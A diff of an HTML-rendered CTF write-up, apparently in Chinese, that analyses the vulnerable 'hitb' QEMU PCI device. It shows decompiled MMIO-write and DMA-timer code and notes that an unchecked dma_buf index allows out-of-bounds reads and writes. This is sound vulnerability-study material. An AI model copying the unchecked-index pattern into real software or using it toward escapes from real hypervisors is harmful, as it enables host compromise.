+</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x8C</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x90</span> <span class=p>)</span>  <span class=c1>// 设置dma.cnt
+</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>              <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=p>}</span>
+</span></span><span class=line><span class=cl>          <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x98</span> <span class=o>&amp;&amp;</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>  <span class=c1>// 设置dma.cmd
+</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=n>v7</span> <span class=o>=</span> <span class=nf>qemu_clock_get_ns</span><span class=p>(</span><span class=n>QEMU_CLOCK_VIRTUAL_0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=nf>timer_mod</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_timer</span><span class=p>,</span> <span class=n>v7</span> <span class=o>/</span> <span class=mi>1000000</span> <span class=o>+</span> <span class=mi>100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x84</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=o>*</span><span class=p>(</span><span class=kt>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x88</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>  <span class=c1>// 设置dma.dst
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>32</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0x80</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=nf>_InterlockedOr</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mh>0x80u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span>
+</span></span><span class=line><span class=cl>          <span class=nf>_InterlockedAnd</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mh>0xFFFFFF7F</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x20</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>96</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=n>v6</span> <span class=o>=</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>val</span> <span class=o>|</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>|=</span> <span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v6</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nf>hitb_raise_irq</span><span class=p>(</span><span class=n>opaque</span><span class=p>,</span> <span class=mh>0x60u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>100</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=n>v5</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&amp;</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>&amp;=</span> <span class=n>v5</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nf>msi_enabled</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>pdev</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nf>pci_set_irq</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>pdev</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>addr4</span> <span class=o>=</span> <span class=o>~</span><span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>val</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mi>8</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>fact</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nf>_InterlockedOr</span><span class=p>((</span><span class=k>volatile</span> <span class=kt>signed</span> <span class=kr>__int32</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>status</span><span class=p>,</span> <span class=mi>1u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>qemu_cond_signal</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_cond</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>qemu_mutex_unlock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>thr_mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ol><li><p><code>addr==0x80 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.src</p></li><li><p><code>addr==0x84 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.src高地址处的4byte。</p><p>（指向无定义空间，从上面dms_state的定义可以看出，其中的成员8字节对齐</p></li><li><p><code>addr==0x88 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.dst</p></li><li><p><code>addr==0x8c && dma.cmd&amp;1==0</code> &mdash;&ndash;> 同上</p></li><li><p><code>addr==0x90 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.cnt</p></li><li><p><code>addr==0x98 && dma.cmd&amp;1==0</code> &mdash;&ndash;> 设置dma.cmd，最低位需为1。同时<code>timer_mod</code>启动定时器，会触发<code>hitb_dma_timer</code></p></li></ol><p><code>hitb_dma_timer</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -786,75 +606,62 @@ $ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span
 </span><span class=lnt>53
 </span><span class=lnt>54
 </span><span class=lnt>55
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>hitb_dma_timer</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=n>dma_addr_t</span> <span class=n>cmd</span><span class=p>;</span> <span class=c1>// rax
-</span><span class=c1></span>  <span class=kr>__int64</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rdx
-</span><span class=c1></span>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>addr</span><span class=p>;</span> <span class=c1>// rsi
-</span><span class=c1></span>  <span class=n>dma_addr_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// rax
-</span><span class=c1></span>  <span class=n>dma_addr_t</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rdx
-</span><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>v6</span><span class=p>;</span> <span class=c1>// rbp
-</span><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span> <span class=c1>// rbp
-</span><span class=c1></span>
-  <span class=n>cmd</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
-  <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=p>)</span>
-  <span class=p>{</span>
-    <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>2</span> <span class=p>)</span>
-    <span class=p>{</span>
-      <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=n>LODWORD</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x40000</span><span class=p>);</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=n>data</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_buf</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
-        <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>enc</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>);</span>
-        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>data</span><span class=p>;</span>
-      <span class=p>}</span>
-      <span class=k>else</span>
-      <span class=p>{</span>
-        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_buf</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
-      <span class=p>}</span>
-      <span class=n>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
-      <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
-      <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
-    <span class=p>}</span>
-    <span class=k>else</span>
-    <span class=p>{</span>
-      <span class=c1>// 这里的反编译很崎岖，但是看反汇编还是可以看出来和读的操作是一致的
-</span><span class=c1></span>      <span class=c1>// 即：addr-0x40000作为idx，索引dma_buf
-</span><span class=c1></span>      <span class=n>v6</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>opaque</span><span class=p>[</span><span class=mh>0xFFFFFFDBLL</span><span class=p>].</span><span class=n>dma_buf</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mh>0x510</span><span class=p>];</span>  
-      <span class=n>LODWORD</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>opaque</span> <span class=o>+</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>-</span> <span class=mh>0x40000</span> <span class=o>+</span> <span class=mh>0xBB8</span><span class=p>;</span>
-      <span class=n>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>v6</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-      <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
-      <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>LODWORD</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>);</span>
-        <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kt>char</span> <span class=o>*</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=p>,</span> <span class=n>dma_addr_t</span><span class=p>))</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>enc</span><span class=p>)(</span><span class=n>v6</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
-        <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
-        <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
-      <span class=p>}</span>
-    <span class=p>}</span>
-    <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFELL</span><span class=p>;</span>  <span class=c1>// 把最低bit清掉了。又可以再次写入了
-</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=n>v5</span> <span class=p>)</span>
-    <span class=p>{</span>
-      <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>irq_status</span> <span class=o>|=</span> <span class=mh>0x100u</span><span class=p>;</span>
-      <span class=n>hitb_raise_irq</span><span class=p>(</span><span class=n>opaque</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=p>)</span><span class=n>addr</span><span class=p>);</span>
-    <span class=p>}</span>
-  <span class=p>}</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>cmd的bit含义</p>
-<ol>
-<li>bit1 &mdash;&ndash;> 是否为合规cmd（推测</li>
-<li>bit2 &mdash;&ndash;> dma.dst向dma.src拷贝，还是相反方向</li>
-<li>bit3 &mdash;&ndash;> 是否使用enc函数加密</li>
-</ol>
-<p><code>cpu_physical_memory_rw</code>函数</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>hitb_dma_timer</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>dma_addr_t</span> <span class=n>cmd</span><span class=p>;</span> <span class=c1>// rax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>idx</span><span class=p>;</span> <span class=c1>// rdx
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>addr</span><span class=p>;</span> <span class=c1>// rsi
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>dma_addr_t</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// rax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>dma_addr_t</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// rdx
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>v6</span><span class=p>;</span> <span class=c1>// rbp
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span> <span class=c1>// rbp
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>cmd</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>2</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=nf>LODWORD</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x40000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_buf</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=n>opaque</span><span class=o>-&gt;</span><span class=nf>enc</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>data</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=k>else</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma_buf</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=c1>// 这里的反编译很崎岖，但是看反汇编还是可以看出来和读的操作是一致的
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=c1>// 即：addr-0x40000作为idx，索引dma_buf
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>v6</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>opaque</span><span class=p>[</span><span class=mh>0xFFFFFFDBLL</span><span class=p>].</span><span class=n>dma_buf</span><span class=p>[(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mh>0x510</span><span class=p>];</span>  
+</span></span><span class=line><span class=cl>      <span class=nf>LODWORD</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span> <span class=o>=</span> <span class=p>(</span><span class=n>_DWORD</span><span class=p>)</span><span class=n>opaque</span> <span class=o>+</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>-</span> <span class=mh>0x40000</span> <span class=o>+</span> <span class=mh>0xBB8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=nf>cpu_physical_memory_rw</span><span class=p>(</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>,</span> <span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span><span class=n>v6</span><span class=p>,</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cmd</span> <span class=o>&amp;</span> <span class=mi>4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
